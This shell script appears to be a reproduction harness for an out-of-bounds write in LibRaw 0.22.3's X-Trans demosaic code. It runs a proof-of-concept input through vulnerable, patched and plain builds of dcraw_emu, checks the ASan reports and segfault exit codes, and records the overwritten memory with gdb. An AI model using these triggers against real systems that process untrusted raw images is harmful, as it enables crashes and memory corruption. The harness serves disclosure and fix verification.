#!/bin/sh
# libraw2shell W197 matrix. Uses the trees built by bootstrap.sh; no network.
set -u
cd "$(dirname "$0")" || exit 2
mkdir -p evidence
: > evidence.log
pass=0; fail=0
check() {
    label=$1; expected=$2; actual=$3
    if [ "$expected" = "$actual" ]; then
        printf 'PASS %-26s rc=%s expected=%s\n' "$label" "$actual" "$expected" >> evidence.log
        pass=$((pass+1))
    else
        printf 'FAIL %-26s rc=%s expected=%s\n' "$label" "$actual" "$expected" >> evidence.log
        fail=$((fail+1))
    fi
}
run() {
    label=$1; expected=$2; shift 2
    "$@" > "$label.out" 2>&1
    rc=$?
    check "$label" "$expected" "$rc"
}

V=pinned/LibRaw-0.22.3/bin/dcraw_emu
F=fixed/LibRaw-0.22.3/bin/dcraw_emu
P=plain/LibRaw-0.22.3/bin/dcraw_emu
O=o0/LibRaw-0.22.3/bin/dcraw_emu
cd evidence || exit 2
INPUT=poc_xtrans_oob_write.input
[ -f "$INPUT" ] || cp ../pinned/$INPUT .
: > evidence.log

run asan-n1 1 ../$V -n 1 $INPUT
run asan-C11 1 ../$V -C 1.1 1 $INPUT
run asan-C111 1 ../$V -C 1 1.1 $INPUT
run asan-safe-default 0 ../$V $INPUT
run fixed-asan-n1 0 ../$F -n 1 $INPUT
run fixed-asan-C11 0 ../$F -C 1.1 1 $INPUT
run fixed-asan-C111 0 ../$F -C 1 1.1 $INPUT
run plain-attack 139 ../$P -n 1 $INPUT
run plain-safe 0 ../$P $INPUT

gdb -q -batch -ex 'set pagination off' \
    -ex 'break xtrans_demosaic.cpp:427 if (row+top)*this->imgdata.sizes.width + col + left >= 68644' \
    -ex 'run -n 1 poc_xtrans_oob_write.input' \
    -ex 'printf "IDX=%d avg={%d,%d,%d,%d} delta=%ld\n", (row+top)*this->imgdata.sizes.width+col+left, avg[0],avg[1],avg[2],avg[3], (char*)&destimage[(row+top)*this->imgdata.sizes.width+col+left][0]-((char*)destimage+549152)' \
    -ex 'x/4xh &destimage[(row+top)*this->imgdata.sizes.width+col+left][0]' \
    ../$O > gdb-oob-value.txt 2>&1

printf 'asan WRITE-2 at :427 in all three attacks: ' >> evidence.log
if [ "$(grep -l 'WRITE of size 2' asan-n1.out asan-C11.out asan-C111.out | wc -l)" = 3 ]; then
    printf 'PASS\n' >> evidence.log; pass=$((pass+1))
else
    printf 'FAIL\n' >> evidence.log; fail=$((fail+1))
fi
printf 'first OOB gdb line: ' >> evidence.log
grep '^IDX=' gdb-oob-value.txt >> evidence.log || true

printf 'PASS=%s FAIL=%s\n' "$pass" "$fail" >> evidence.log
sha256sum ../pinned/LibRaw-0.22.3.tar.gz ../pinned/fix-894.patch $INPUT >> evidence.log
sha256sum ../pinned/LibRaw-0.22.3/bin/dcraw_emu ../fixed/LibRaw-0.22.3/bin/dcraw_emu \
    ../plain/LibRaw-0.22.3/bin/dcraw_emu ../o0/LibRaw-0.22.3/bin/dcraw_emu >> evidence.log
sha256sum *.out *.txt >> evidence.log
cat evidence.log
